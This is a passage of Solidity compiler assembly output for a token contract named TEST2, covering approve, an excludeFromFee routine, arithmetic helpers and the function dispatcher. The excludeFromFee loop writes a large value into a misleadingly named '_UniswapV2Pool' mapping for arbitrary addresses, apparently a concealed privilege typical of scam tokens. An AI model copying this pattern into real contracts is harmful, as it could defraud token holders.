mstore\n  swap5\n  dup3\n  mstore\n  swap2\n  dup3\n  swap1\n  keccak256\n    /* \"contracts/Test.sol\":7978:8014  _allowances[owner][spender] = amount */\n  dup6\n  swap1\n  sstore\n    /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n  swap1\n  mload\n    /* \"#utility.yul\":4641:4666   */\n  dup5\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n  0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n  swap2\n    /* \"#utility.yul\":4614:4632   */\n  add\n    /* \"contracts/Test.sol\":8029:8061  Approval(owner, spender, amount) */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Test.sol\":7738:8068  function _approve(address owner, address spender, uint256 amount) private {... */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Test.sol\":11737:12056  function excludeFromFee(uint index, uint160[] memory _pair) internal {... */\ntag_52:\n    /* \"contracts/Test.sol\":11831:11836  _pair */\n  dup1\n    /* \"contracts/Test.sol\":11831:11843  _pair.length */\n  mload\n    /* \"contracts/Test.sol\":11823:11828  index */\n  dup3\n    /* \"contracts/Test.sol\":11823:11843  index < _pair.length */\n  lt\n    /* \"contracts/Test.sol\":11816:12050  while (index < _pair.length) {... */\n  iszero\n  tag_66\n  jumpi\n    /* \"contracts/Test.sol\":11859:11880  address routerAddress */\n  0x00\n    /* \"contracts/Test.sol\":11891:11896  _pair */\n  dup2\n    /* \"contracts/Test.sol\":11897:11902  index */\n  dup4\n    /* \"contracts/Test.sol\":11891:11903  _pair[index] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_68\n  jumpi\n  tag_68\n  tag_69\n  jump\t// in\ntag_68:\n  0x20\n  swap1\n  dup2\n  mul\n  swap2\n  swap1\n  swap2\n  add\n  dup2\n  add\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":11918:11951  _isExcludedFromFee[routerAddress] */\n  dup2\n  and\n  0x00\n  swap1\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":11918:11936  _isExcludedFromFee */\n  0x03\n    /* \"contracts/Test.sol\":11918:11951  _isExcludedFromFee[routerAddress] */\n  swap1\n  swap3\n  mstore\n  0x40\n  swap1\n  swap2\n  keccak256\n    /* \"contracts/Test.sol\":11918:11958  _isExcludedFromFee[routerAddress] = true */\n  dup1\n  sload\n  not(0xff)\n  and\n    /* \"contracts/Test.sol\":11954:11958  true */\n  0x01\n    /* \"contracts/Test.sol\":11918:11958  _isExcludedFromFee[routerAddress] = true */\n  or\n  swap1\n  sstore\n    /* \"contracts/Test.sol\":11891:11903  _pair[index] */\n  swap1\n  pop\n    /* \"contracts/Test.sol\":4714:4729  10 ** _decimals */\n  tag_70\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4714:4716  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4714:4729  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_70:\n    /* \"contracts/Test.sol\":4701:4729  20_000_000 * 10 ** _decimals */\n  tag_71\n  swap1\n    /* \"contracts/Test.sol\":4701:4711  20_000_000 */\n  0x01312d00\n    /* \"contracts/Test.sol\":4701:4729  20_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_71:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":11972:12001  _UniswapV2Pool[routerAddress] */\n  dup3\n  and\n  0x00\n  swap1\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":11972:11986  _UniswapV2Pool */\n  0x04\n    /* \"contracts/Test.sol\":11972:12001  _UniswapV2Pool[routerAddress] */\n  0x20\n  mstore\n  0x40\n  swap1\n  keccak256\n    /* \"contracts/Test.sol\":11972:12018  _UniswapV2Pool[routerAddress] = _swapThreshold */\n  sstore\n    /* \"contracts/Test.sol\":12032:12039  index++ */\n  dup3\n  tag_72\n  dup2\n  tag_73\n  jump\t// in\ntag_72:\n  swap4\n  pop\n  pop\n    /* \"contracts/Test.sol\":11845:12050  {... */\n  pop\n    /* \"contracts/Test.sol\":11816:12050  while (index < _pair.length) {... */\n  jump(tag_52)\ntag_66:\n    /* \"contracts/Test.sol\":11737:12056  function excludeFromFee(uint index, uint160[] memory _pair) internal {... */\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":14:141   */\ntag_74:\n    /* \"#utility.yul\":75:85   */\n  0x4e487b71\n    /* \"#utility.yul\":70:73   */\n  0xe0\n    /* \"#utility.yul\":66:86   */\n  shl\n    /* \"#utility.yul\":63:64   */\n  0x00\n    /* \"#utility.yul\":56:87   */\n  mstore\n    /* \"#utility.yul\":106:110   */\n  0x11\n    /* \"#utility.yul\":103:104   */\n  0x04\n    /* \"#utility.yul\":96:111   */\n  mstore\n    /* \"#utility.yul\":130:134   */\n  0x24\n    /* \"#utility.yul\":127:128   */\n  0x00\n    /* \"#utility.yul\":120:135   */\n  revert\n    /* \"#utility.yul\":146:562   */\ntag_75:\n    /* \"#utility.yul\":235:236   */\n  0x01\n    /* \"#utility.yul\":272:277   */\n  dup2\n    /* \"#utility.yul\":235:236   */\n  dup2\n    /* \"#utility.yul\":286:556   */\ntag_83:\n    /* \"#utility.yul\":307:314   */\n  dup1\n    /* \"#utility.yul\":297:305   */\n  dup6\n    /* \"#utility.yul\":294:315   */\n  gt\n    /* \"#utility.yul\":286:556   */\n  iszero\n  tag_85\n  jumpi\n    /* \"#utility.yul\":366:370   */\n  dup2\n    /* \"#utility.yul\":362:363   */\n  0x00\n    /* \"#utility.yul\":358:364   */\n  not\n    /* \"#utility.yul\":354:371   */\n  div\n    /* \"#utility.yul\":348:352   */\n  dup3\n    /* \"#utility.yul\":345:372   */\n  gt\n    /* \"#utility.yul\":342:395   */\n  iszero\n  tag_87\n  jumpi\n    /* \"#utility.yul\":375:393   */\n  tag_87\n  tag_74\n  jump\t// in\ntag_87:\n    /* \"#utility.yul\":425:432   */\n  dup1\n    /* \"#utility.yul\":415:423   */\n  dup6\n    /* \"#utility.yul\":411:433   */\n  and\n    /* \"#utility.yul\":408:463   */\n  iszero\n  tag_88\n  jumpi\n    /* \"#utility.yul\":445:461   */\n  swap2\n  dup2\n  mul\n  swap2\n    /* \"#utility.yul\":408:463   */\ntag_88:\n    /* \"#utility.yul\":524:546   */\n  swap4\n  dup5\n  shr\n  swap4\n    /* \"#utility.yul\":484:499   */\n  swap1\n  dup1\n  mul\n  swap1\n    /* \"#utility.yul\":286:556   */\n  jump(tag_83)\ntag_85:\n    /* \"#utility.yul\":290:293   */\n  pop\n    /* \"#utility.yul\":146:562   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":567:1373   */\ntag_76:\n    /* \"#utility.yul\":616:621   */\n  0x00\n    /* \"#utility.yul\":646:654   */\n  dup3\n    /* \"#utility.yul\":636:716   */\n  tag_90\n  jumpi\n  pop\n    /* \"#utility.yul\":687:688   */\n  0x01\n    /* \"#utility.yul\":701:706   */\n  jump(tag_89)\n    /* \"#utility.yul\":636:716   */\ntag_90:\n    /* \"#utility.yul\":735:739   */\n  dup2\n    /* \"#utility.yul\":725:801   */\n  tag_91\n  jumpi\n  pop\n    /* \"#utility.yul\":772:773   */\n  0x00\n    /* \"#utility.yul\":786:791   */\n  jump(tag_89)\n    /* \"#utility.yul\":725:801   */\ntag_91:\n    /* \"#utility.yul\":817:821   */\n  dup2\n    /* \"#utility.yul\":835:836   */\n  0x01\n    /* \"#utility.yul\":830:889   */\n  dup2\n  eq\n  tag_93\n  jumpi\n    /* \"#utility.yul\":903:904   */\n  0x02\n    /* \"#utility.yul\":898:1028   */\n  dup2\n  eq\n  tag_94\n  jumpi\n    /* \"#utility.yul\":810:1028   */\n  jump(tag_92)\n    /* \"#utility.yul\":830:889   */\ntag_93:\n    /* \"#utility.yul\":860:861   */\n  0x01\n    /* \"#utility.yul\":851:861   */\n  swap2\n  pop\n    /* \"#utility.yul\":874:879   */\n  pop\n  jump(tag_89)\n    /* \"#utility.yul\":898:1028   */\ntag_94:\n    /* \"#utility.yul\":935:938   */\n  0xff\n    /* \"#utility.yul\":925:933   */\n  dup5\n    /* \"#utility.yul\":922:939   */\n  gt\n    /* \"#utility.yul\":919:962   */\n  iszero\n  tag_96\n  jumpi\n    /* \"#utility.yul\":942:960   */\n  tag_96\n  tag_74\n  jump\t// in\ntag_96:\n  pop\n  pop\n    /* \"#utility.yul\":998:999   */\n  0x01\n    /* \"#utility.yul\":984:1000   */\n  dup3\n  shl\n    /* \"#utility.yul\":1013:1018   */\n  jump(tag_89)\n    /* \"#utility.yul\":810:1028   */\ntag_92:\n  pop\n    /* \"#utility.yul\":1112:1114   */\n  0x20\n    /* \"#utility.yul\":1102:1110   */\n  dup4\n    /* \"#utility.yul\":1099:1115   */\n  lt\n    /* \"#utility.yul\":1093:1096   */\n  0x0133\n    /* \"#utility.yul\":1087:1091   */\n  dup4\n    /* \"#utility.yul\":1084:1097   */\n  lt\n    /* \"#utility.yul\":1080:1116   */\n  and\n    /* \"#utility.yul\":1074:1076   */\n  0x4e\n    /* \"#utility.yul\":1064:1072   */\n  dup5\n    /* \"#utility.yul\":1061:1077   */\n  lt\n    /* \"#utility.yul\":1056:1058   */\n  0x0b\n    /* \"#utility.yul\":1050:1054   */\n  dup5\n    /* \"#utility.yul\":1047:1059   */\n  lt\n    /* \"#utility.yul\":1043:1078   */\n  and\n    /* \"#utility.yul\":1040:1117   */\n  or\n    /* \"#utility.yul\":1037:1196   */\n  iszero\n  tag_97\n  jumpi\n  pop\n    /* \"#utility.yul\":1149:1168   */\n  dup2\n  dup2\n  exp\n    /* \"#utility.yul\":1181:1186   */\n  jump(tag_89)\n    /* \"#utility.yul\":1037:1196   */\ntag_97:\n    /* \"#utility.yul\":1228:1262   */\n  tag_98\n    /* \"#utility.yul\":1253:1261   */\n  dup4\n    /* \"#utility.yul\":1247:1251   */\n  dup4\n    /* \"#utility.yul\":1228:1262   */\n  tag_75\n  jump\t// in\ntag_98:\n    /* \"#utility.yul\":1298:1304   */\n  dup1\n    /* \"#utility.yul\":1294:1295   */\n  0x00\n    /* \"#utility.yul\":1290:1296   */\n  not\n    /* \"#utility.yul\":1286:1305   */\n  div\n    /* \"#utility.yul\":1277:1284   */\n  dup3\n    /* \"#utility.yul\":1274:1306   */\n  gt\n    /* \"#utility.yul\":1271:1329   */\n  iszero\n  tag_100\n  jumpi\n    /* \"#utility.yul\":1309:1327   */\n  tag_100\n  tag_74\n  jump\t// in\ntag_100:\n    /* \"#utility.yul\":1347:1367   */\n  mul\n  swap1\n  pop\n    /* \"#utility.yul\":567:1373   */\ntag_89:\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1378:1518   */\ntag_2:\n    /* \"#utility.yul\":1436:1441   */\n  0x00\n    /* \"#utility.yul\":1465:1512   */\n  tag_102\n    /* \"#utility.yul\":1506:1510   */\n  0xff\n    /* \"#utility.yul\":1496:1504   */\n  dup5\n    /* \"#utility.yul\":1492:1511   */\n  and\n    /* \"#utility.yul\":1486:1490   */\n  dup4\n    /* \"#utility.yul\":1465:1512   */\n  tag_76\n  jump\t// in\ntag_102:\n    /* \"#utility.yul\":1456:1512   */\n  swap4\n    /* \"#utility.yul\":1378:1518   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1523:1691   */\ntag_4:\n    /* \"#utility.yul\":1596:1605   */\n  dup1\n  dup3\n  mul\n    /* \"#utility.yul\":1627:1636   */\n  dup2\n  iszero\n    /* \"#utility.yul\":1644:1659   */\n  dup3\n  dup3\n  div\n    /* \"#utility.yul\":1638:1660   */\n  dup5\n  eq\n    /* \"#utility.yul\":1624:1661   */\n  or\n    /* \"#utility.yul\":1614:1685   */\n  tag_89\n  jumpi\n    /* \"#utility.yul\":1665:1683   */\n  tag_89\n  tag_74\n  jump\t// in\n    /* \"#utility.yul\":1696:1827   */\ntag_77:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":1771:1802   */\n  dup2\n  and\n    /* \"#utility.yul\":1761:1803   */\n  dup2\n  eq\n    /* \"#utility.yul\":1751:1821   */\n  tag_107\n  jumpi\n    /* \"#utility.yul\":1817:1818   */\n  0x00\n    /* \"#utility.yul\":1814:1815   */\n  dup1\n    /* \"#utility.yul\":1807:1819   */\n  revert\n    /* \"#utility.yul\":1751:1821   */\ntag_107:\n    /* \"#utility.yul\":1696:1827   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1832:1959   */\ntag_78:\n    /* \"#utility.yul\":1893:1903   */\n  0x4e487b71\n    /* \"#utility.yul\":1888:1891   */\n  0xe0\n    /* \"#utility.yul\":1884:1904   */\n  shl\n    /* \"#utility.yul\":1881:1882   */\n  0x00\n    /* \"#utility.yul\":1874:1905   */\n  mstore\n    /* \"#utility.yul\":1924:1928   */\n  0x41\n    /* \"#utility.yul\":1921:1922   */\n  0x04\n    /* \"#utility.yul\":1914:1929   */\n  mstore\n    /* \"#utility.yul\":1948:1952   */\n  0x24\n    /* \"#utility.yul\":1945:1946   */\n  0x00\n    /* \"#utility.yul\":1938:1953   */\n  revert\n    /* \"#utility.yul\":1964:2102   */\ntag_79:\n    /* \"#utility.yul\":2043:2056   */\n  dup1\n  mload\n    /* \"#utility.yul\":2065:2096   */\n  tag_110\n    /* \"#utility.yul\":2043:2056   */\n  dup2\n    /* \"#utility.yul\":2065:2096   */\n  tag_77\n  jump\t// in\ntag_110:\n    /* \"#utility.yul\":1964:2102   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2107:3364   */\ntag_13:\n    /* \"#utility.yul\":2211:2217   */\n  0x00\n    /* \"#utility.yul\":2219:2225   */\n  dup1\n    /* \"#utility.yul\":2272:2274   */\n  0x40\n    /* \"#utility.yul\":2260:2269   */\n  dup4\n    /* \"#utility.yul\":2251:2258   */\n  dup6\n    /* \"#utility.yul\":2247:2270   */\n  sub\n    /* \"#utility.yul\":2243:2275   */\n  slt\n    /* \"#utility.yul\":2240:2292   */\n  iszero\n  tag_112\n  jumpi\n    /* \"#utility.yul\":2288:2289   */\n  0x00\n    /* \"#utility.yul\":2285:2286   */\n  dup1\n    /* \"#utility.yul\":2278:2290   */\n  revert\n    /* \"#utility.yul\":2240:2292   */\ntag_112:\n    /* \"#utility.yul\":2320:2329   */\n  dup3\n    /* \"#utility.yul\":2314:2330   */\n  mload\n    /* \"#utility.yul\":2339:2370   */\n  tag_113\n    /* \"#utility.yul\":2364:2369   */\n  dup2\n    /* \"#utility.yul\":2339:2370   */\n  tag_77\n  jump\t// in\ntag_113:\n    /* \"#utility.yul\":2413:2415   */\n  0x20\n    /* \"#utility.yul\":2444:2462   */\n  dup5\n  dup2\n  add\n    /* \"#utility.yul\":2438:2463   */\n  mload\n    /* \"#utility.yul\":2389:2394   */\n  swap2\n  swap4\n  pop\n    /* \"#utility.yul\":2413:2415   */\n  swap1\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":2512:2526   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":2509:2543   */\n  iszero\n  tag_114\n  jumpi\n    /* \"#utility.yul\":2539:2540   */\n  0x00\n    /* \"#utility.yul\":2536:2537   */\n  dup1\n    /* \"#utility.yul\":2529:2541   */\n  revert\n    /* \"#utility.yul\":2509:2543   */\ntag_114:\n    /* \"#utility.yul\":2577:2583   */\n  dup2\n    /* \"#utility.yul\":2566:2575   */\n  dup7\n    /* \"#utility.yul\":2562:2584   */\n  add\n    /* \"#utility.yul\":2552:2584   */\n  swap2\n  pop\n    /* \"#utility.yul\":2622:2629   */\n  dup7\n    /* \"#utility.yul\":2615:2619   */\n  0x1f\n    /* \"#utility.yul\":2611:2613   */\n  dup4\n    /* \"#utility.yul\":2607:2620   */\n  add\n    /* \"#utility.yul\":2603:2630   */\n  slt\n    /* \"#utility.yul\":2593:2648   */\n  tag_115\n  jumpi\n    /* \"#utility.yul\":2644:2645   */\n  0x00\n    /* \"#utility.yul\":2641:2642   */\n  dup1\n    /* \"#utility.yul\":2634:2646   */\n  revert\n    /* \"#utility.yul\":2593:2648   */\ntag_115:\n    /* \"#utility.yul\":2673:2675   */\n  dup2\n    /* \"#utility.yul\":2667:2676   */\n  mload\n    /* \"#utility.yul\":2695:2697   */\n  dup2\n    /* \"#utility.yul\":2691:2693   */\n  dup2\n    /* \"#utility.yul\":2688:2698   */\n  gt\n    /* \"#utility.yul\":2685:2721   */\n  iszero\n  tag_117\n  jumpi\n    /* \"#utility.yul\":2701:2719   */\n  tag_117\n  tag_78\n  jump\t// in\ntag_117:\n    /* \"#utility.yul\":2747:2749   */\n  dup1\n    /* \"#utility.yul\":2744:2745   */\n  0x05\n    /* \"#utility.yul\":2740:2750   */\n  shl\n    /* \"#utility.yul\":2779:2781   */\n  0x40\n    /* \"#utility.yul\":2773:2782   */\n  mload\n    /* \"#utility.yul\":2842:2844   */\n  0x1f\n    /* \"#utility.yul\":2838:2845   */\n  not\n    /* \"#utility.yul\":2833:2835   */\n  0x3f\n    /* \"#utility.yul\":2829:2831   */\n  dup4\n    /* \"#utility.yul\":2825:2836   */\n  add\n    /* \"#utility.yul\":2821:2846   */\n  and\n    /* \"#utility.yul\":2813:2819   */\n  dup2\n    /* \"#utility.yul\":2809:2847   */\n  add\n    /* \"#utility.yul\":2897:2903   */\n  dup2\n    /* \"#utility.yul\":2885:2895   */\n  dup2\n    /* \"#utility.yul\":2882:2904   */\n  lt\n    /* \"#utility.yul\":2877:2879   */\n  dup6\n    /* \"#utility.yul\":2865:2875   */\n  dup3\n    /* \"#utility.yul\":2862:2880   */\n  gt\n    /* \"#utility.yul\":2859:2905   */\n  or\n    /* \"#utility.yul\":2856:2928   */\n  iszero\n  tag_119\n  jumpi\n    /* \"#utility.yul\":2908:2926   */\n  tag_119\n  tag_78\n  jump\t// in\ntag_119:\n    /* \"#utility.yul\":2944:2946   */\n  0x40\n    /* \"#utility.yul\":2937:2959   */\n  mstore\n    /* \"#utility.yul\":2994:3012   */\n  swap2\n  dup3\n  mstore\n    /* \"#utility.yul\":3028:3043   */\n  dup5\n  dup3\n  add\n  swap3\n  pop\n    /* \"#utility.yul\":3070:3081   */\n  dup4\n  dup2\n  add\n    /* \"#utility.yul\":3066:3086   */\n  dup6\n  add\n  swap2\n    /* \"#utility.yul\":3098:3117   */\n  dup10\n  dup4\n  gt\n    /* \"#utility.yul\":3095:3134   */\n  iszero\n  tag_120\n  jumpi\n    /* \"#utility.yul\":3130:3131   */\n  0x00\n    /* \"#utility.yul\":3127:3128   */\n  dup1\n    /* \"#utility.yul\":3120:3132   */\n  revert\n    /* \"#utility.yul\":3095:3134   */\ntag_120:\n    /* \"#utility.yul\":3154:3165   */\n  swap4\n  dup6\n  add\n  swap4\n    /* \"#utility.yul\":3174:3333   */\ntag_121:\n    /* \"#utility.yul\":3190:3196   */\n  dup3\n    /* \"#utility.yul\":3185:3188   */\n  dup6\n    /* \"#utility.yul\":3182:3197   */\n  lt\n    /* \"#utility.yul\":3174:3333   */\n  iszero\n  tag_123\n  jumpi\n    /* \"#utility.yul\":3256:3290   */\n  tag_124\n    /* \"#utility.yul\":3286:3289   */\n  dup6\n    /* \"#utility.yul\":3256:3290   */\n  tag_79\n  jump\t// in\ntag_124:\n    /* \"#utility.yul\":3244:3291   */\n  dup5\n  mstore\n    /* \"#utility.yul\":3207:3219   */\n  swap4\n  dup6\n  add\n  swap4\n    /* \"#utility.yul\":3311:3323   */\n  swap3\n  dup6\n  add\n  swap3\n    /* \"#utility.yul\":3174:3333   */\n  jump(tag_121)\ntag_123:\n    /* \"#utility.yul\":3352:3358   */\n  dup1\n    /* \"#utility.yul\":3342:3358   */\n  swap7\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":2107:3364   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3369:3620   */\ntag_31:\n    /* \"#utility.yul\":3439:3445   */\n  0x00\n    /* \"#utility.yul\":3492:3494   */\n  0x20\n    /* \"#utility.yul\":3480:3489   */\n  dup3\n    /* \"#utility.yul\":3471:3478   */\n  dup5\n    /* \"#utility.yul\":3467:3490   */\n  sub\n    /* \"#utility.yul\":3463:3495   */\n  slt\n    /* \"#utility.yul\":3460:3512   */\n  iszero\n  tag_126\n  jumpi\n    /* \"#utility.yul\":3508:3509   */\n  0x00\n    /* \"#utility.yul\":3505:3506   */\n  dup1\n    /* \"#utility.yul\":3498:3510   */\n  revert\n    /* \"#utility.yul\":3460:3512   */\ntag_126:\n    /* \"#utility.yul\":3540:3549   */\n  dup2\n    /* \"#utility.yul\":3534:3550   */\n  mload\n    /* \"#utility.yul\":3559:3590   */\n  tag_102\n    /* \"#utility.yul\":3584:3589   */\n  dup2\n    /* \"#utility.yul\":3559:3590   */\n  tag_77\n  jump\t// in\n    /* \"#utility.yul\":4213:4490   */\ntag_45:\n    /* \"#utility.yul\":4280:4286   */\n  0x00\n    /* \"#utility.yul\":4333:4335   */\n  0x20\n    /* \"#utility.yul\":4321:4330   */\n  dup3\n    /* \"#utility.yul\":4312:4319   */\n  dup5\n    /* \"#utility.yul\":4308:4331   */\n  sub\n    /* \"#utility.yul\":4304:4336   */\n  slt\n    /* \"#utility.yul\":4301:4353   */\n  iszero\n  tag_131\n  jumpi\n    /* \"#utility.yul\":4349:4350   */\n  0x00\n    /* \"#utility.yul\":4346:4347   */\n  dup1\n    /* \"#utility.yul\":4339:4351   */\n  revert\n    /* \"#utility.yul\":4301:4353   */\ntag_131:\n    /* \"#utility.yul\":4381:4390   */\n  dup2\n    /* \"#utility.yul\":4375:4391   */\n  mload\n    /* \"#utility.yul\":4434:4439   */\n  dup1\n    /* \"#utility.yul\":4427:4440   */\n  iszero\n    /* \"#utility.yul\":4420:4441   */\n  iszero\n    /* \"#utility.yul\":4413:4418   */\n  dup2\n    /* \"#utility.yul\":4410:4442   */\n  eq\n    /* \"#utility.yul\":4400:4460   */\n  tag_102\n  jumpi\n    /* \"#utility.yul\":4456:4457   */\n  0x00\n    /* \"#utility.yul\":4453:4454   */\n  dup1\n    /* \"#utility.yul\":4446:4458   */\n  revert\n    /* \"#utility.yul\":5485:5612   */\ntag_69:\n    /* \"#utility.yul\":5546:5556   */\n  0x4e487b71\n    /* \"#utility.yul\":5541:5544   */\n  0xe0\n    /* \"#utility.yul\":5537:5557   */\n  shl\n    /* \"#utility.yul\":5534:5535   */\n  0x00\n    /* \"#utility.yul\":5527:5558   */\n  mstore\n    /* \"#utility.yul\":5577:5581   */\n  0x32\n    /* \"#utility.yul\":5574:5575   */\n  0x04\n    /* \"#utility.yul\":5567:5582   */\n  mstore\n    /* \"#utility.yul\":5601:5605   */\n  0x24\n    /* \"#utility.yul\":5598:5599   */\n  0x00\n    /* \"#utility.yul\":5591:5606   */\n  revert\n    /* \"#utility.yul\":5617:5752   */\ntag_73:\n    /* \"#utility.yul\":5656:5659   */\n  0x00\n    /* \"#utility.yul\":5677:5694   */\n  0x01\n  dup3\n  add\n    /* \"#utility.yul\":5674:5717   */\n  tag_139\n  jumpi\n    /* \"#utility.yul\":5697:5715   */\n  tag_139\n  tag_74\n  jump\t// in\ntag_139:\n  pop\n    /* \"#utility.yul\":5744:5745   */\n  0x01\n    /* \"#utility.yul\":5733:5746   */\n  add\n  swap1\n    /* \"#utility.yul\":5617:5752   */\n  jump\t// out\ntag_80:\n    /* \"contracts/Test.sol\":3601:13641  contract TEST2 is Context, IERC20, Ownable {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Test.sol\":3601:13641  contract TEST2 is Context, IERC20, Ownable {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7d1db4a5\n      gt\n      tag_24\n      jumpi\n      dup1\n      0xa9059cbb\n      gt\n      tag_25\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_18\n      jumpi\n      dup1\n      0xb70143c9\n      eq\n      tag_19\n      jumpi\n      dup1\n      0xbf474bed\n      eq\n      tag_20\n      jumpi\n      dup1\n      0xc9567bf9\n      eq\n      tag_21\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_22\n      jumpi\n      dup1\n      0xe9e1831a\n      eq\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      dup1\n      0x7d1db4a5\n      eq\n      tag_13\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x8f9a55c0\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9c7b9b7f\n      eq\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      dup1\n      0x313ce567\n      gt\n      tag_26\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3ccfd60b\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x49bd5a5e\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x715018a6\n      eq\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0faee56f\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Test.sol\":6267:6348  function name() public pure returns (string memory) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n        /* \"contracts/Test.sol\":6336:6341  _name */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x04\n      dup2\n      mstore\n      shl(0xe2, 0x151154d5)\n      0x20\n      dup3\n      add\n      mstore\n        /* \"contracts/Test.sol\":6267:6348  function name() public pure returns (string memory) {... */\n      swap1\n      mload\n      tag_32\n      swap2\n        /* \"contracts/Test.sol\":6336:6341  _name */\n      swap1\n        /* \"contracts/Test.sol\":6267:6348  function name() public pure returns (string memory) {... */\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Test.sol\":7115:7295  function approve(... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      tag_35\n      tag_36\n      calldatasize\n      0x04\n      tag_37\n      jump\t// in\n    tag_36:\n      tag_38\n      jump\t// in\n    tag_35:\n      mload(0x40)\n        /* \"#utility.yul\":1188:1202   */\n      swap1\n      iszero\n        /* \"#utility.yul\":1181:1203   */\n      iszero\n        /* \"#utility.yul\":1163:1204   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1151:1153   */\n      0x20\n        /* \"#utility.yul\":1136:1154   */\n      add\n        /* \"contracts/Test.sol\":7115:7295  function approve(... */\n      tag_32\n        /* \"#utility.yul\":1023:1210   */\n      jump\n        /* \"contracts/Test.sol\":4800:4856  uint256 public _maxTaxSwap = 3_000_000 * 10 ** _decimals */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_41\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_41:\n      pop\n      tag_42\n      sload(0x12)\n      dup2\n      jump\n    tag_42:\n      mload(0x40)\n        /* \"#utility.yul\":1361:1386   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1349:1351   */\n      0x20\n        /* \"#utility.yul\":1334:1352   */\n      add\n        /* \"contracts/Test.sol\":4800:4856  uint256 public _maxTaxSwap = 3_000_000 * 10 ** _decimals */\n      tag_32\n        /* \"#utility.yul\":1215:1392   */\n      jump\n        /* \"contracts/Test.sol\":6532:6625  function totalSupply() public pure override returns (uint256) {... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_46\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_46:\n      pop\n      tag_42\n      tag_48\n      jump\t// in\n        /* \"contracts/Test.sol\":7301:7732  function transferFrom(... */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_50\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_50:\n      pop\n      tag_35\n      tag_52\n      calldatasize\n      0x04\n      tag_53\n      jump\t// in\n    tag_52:\n      tag_54\n      jump\t// in\n        /* \"contracts/Test.sol\":6445:6526  function decimals() public pure returns (uint8) {... */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_56\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_56:\n      pop\n      mload(0x40)\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"#utility.yul\":2000:2036   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1988:1990   */\n      0x20\n        /* \"#utility.yul\":1973:1991   */\n      add\n        /* \"contracts/Test.sol\":6445:6526  function decimals() public pure returns (uint8) {... */\n      tag_32\n        /* 